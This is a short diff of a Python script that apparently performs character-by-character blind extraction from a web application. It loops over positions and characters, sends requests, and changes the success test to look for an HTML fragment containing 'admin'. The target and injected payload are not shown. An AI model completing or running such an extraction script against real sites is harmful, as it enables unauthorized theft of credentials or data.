@@ -17,7 +17,7 @@ for j in range(1,20):
         request.get_method = lambda:'GET'
         data = opener.open(request)
         response = data.read()
-        if 'OK' in response:
+        if 'size=4 color=blue>admin</f' in response:
             resu+=chr(i)
             break
             print("[+] success##########################################")
